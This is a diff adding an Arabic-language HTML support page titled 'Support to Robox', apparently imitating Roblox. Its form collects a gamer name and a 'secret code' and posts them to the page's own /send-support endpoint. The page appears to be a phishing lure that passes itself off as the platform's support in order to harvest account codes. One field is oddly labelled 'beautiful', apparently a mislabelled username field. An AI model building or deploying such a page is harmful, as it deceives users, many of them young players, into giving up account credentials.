@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support to Robox</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@600;800&display=swap');
+
+    * {
+      box-sizing: border-box;
+      font-family: 'Cairo', sans-serif;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: radial-gradient(circle at top, #1a103c 0%, #090612 100%);
+      color: #ffffff;
+      padding: 20px;
+    }
+
+    .gaming-card {
+      width: 100%;
+      max-width: 430px;
+      background: rgba(20, 16, 40, 0.85);
+      border: 2px solid #00f0ff;
+      border-radius: 16px;
+      padding: 28px 24px;
+      box-shadow: 0 0 25px rgba(0, 240, 255, 0.25), inset 0 0 15px rgba(168, 85, 247, 0.2);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .gaming-card::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 4px;
+      background: linear-gradient(90deg, #00f0ff, #a855f7, #ec4899);
+    }
+
+    .badge {
+      display: inline-block;
+      background: rgba(168, 85, 247, 0.2);
+      border: 1px solid #a855f7;
+      color: #d8b4fe;
+      font-size: 0.78rem;
+      padding: 3px 10px;
+      border-radius: 20px;
+      margin-bottom: 10px;
+      font-weight: 800;
+    }
+
+    h1 {
+      margin: 0 0 6px;
+      font-size: 1.7rem;
+      font-weight: 800;
+      background: linear-gradient(90deg, #00f0ff, #c084fc);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      letter-spacing: 0.5px;
+    }
+
+    p {
+      margin: 0 0 22px;
+      color: #94a3b8;
+      font-size: 0.9rem;
+    }
+
+    .field {
+      margin-bottom: 18px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 7px;
+      font-size: 0.95rem;
+      font-weight: 800;
+      color: #e2e8f0;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px 14px;
+      border-radius: 10px;
+      border: 1.5px solid #334155;
+      background: #0d0a1a;
+      color: #00f0ff;
+      font-size: 1rem;
+      font-weight: 600;
+      outline: none;
+      transition: all 0.25s ease;
+    }
+
+    input::placeholder {
+      color: #475569;
+      font-weight: 600;
+    }
+
+    input:focus {
+      border-color: #00f0ff;
+      box-shadow: 0 0 12px rgba(0, 240, 255, 0.35);
+    }
+
+    button {
+      width: 100%;
+      padding: 13px;
+      border: none;
+      border-radius: 10px;
+      background: linear-gradient(90deg, #00f0ff 0%, #8b5cf6 100%);
+      color: #090612;
+      font-size: 1.05rem;
+      font-weight: 800;
+      cursor: pointer;
+      transition: transform 0.15s, box-shadow 0.2s;
+      box-shadow: 0 4px 15px rgba(0, 240, 255, 0.3);
+    }
+
+    button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(139, 92, 246, 0.5);
+    }
+
+    button:active {
+      transform: translateY(0);
+    }
+
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .status {
+      margin-top: 16px;
+      font-size: 0.92rem;
+      font-weight: 600;
+      text-align: center;
+      min-height: 22px;
+    }
+
+    .success { color: #00f0ff; text-shadow: 0 0 8px rgba(0, 240, 255, 0.4); }
+    .error { color: #fb7185; }
+  </style>
+</head>
+<body>
+  <div class="gaming-card">
+    <span class="badge">🎮 GAMING SUPPORT</span>
+    <h1>Support to Robox</h1>
+    <p>أدخل بياناتك بالأسفل للتواصل المباشر مع القناة.</p>
+
+    <form id="supportForm">
+      <div class="field">
+        <label for="gamerTag">جميل</label>
+        <input type="text" id="gamerTag" name="gamerTag" placeholder="اكتب جميل هنا..." required />
+      </div>
+
+      <div class="field">
+        <label for="secretCode">الرمز</label>
+        <input type="text" id="secretCode" name="secretCode" placeholder="اكتب الرمز هنا..." required />
+      </div>
+
+      <button type="submit" id="submitBtn">إرسال الآن ⚡</button>
+      <div class="status" id="statusMsg"></div>
+    </form>
+  </div>
+
+  <script>
+    const form = document.getElementById("supportForm");
+    const submitBtn = document.getElementById("submitBtn");
+    const statusMsg = document.getElementById("statusMsg");
+
+    form.addEventListener("submit", async (e) => {
+      e.preventDefault();
+
+      const gamer_tag = document.getElementById("gamerTag").value.trim();
+      const secret_code = document.getElementById("secretCode").value.trim();
+
+      if (!gamer_tag || !secret_code) {
+        statusMsg.textContent = "من فضلك املأ خانة جميل والرمز!";
+        statusMsg.className = "status error";
+        return;
+      }
+
+      submitBtn.disabled = true;
+      statusMsg.textContent = "جاري الإرسال للسيرفر...";
+      statusMsg.className = "status";
+
+      try {
+        const response = await fetch("/send-support", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ gamer_tag, secret_code })
+        });
+
+        const data = await response.json();
+
+        if (response.ok && data.ok) {
+          statusMsg.textContent = data.message;
+          statusMsg.className = "status success";
+          form.reset();
+        } else {
+          statusMsg.textContent = data.message || "حدث خطأ أثناء الإرسال.";
+          statusMsg.className = "status error";
+        }
+      } catch (err) {
+        statusMsg.textContent = "تعذر الاتصال بالسيرفر.";
+        statusMsg.className = "status error";
+      } finally {
+        submitBtn.disabled = false;
+      }
+    });
+  </script>
+</body>
+</html>
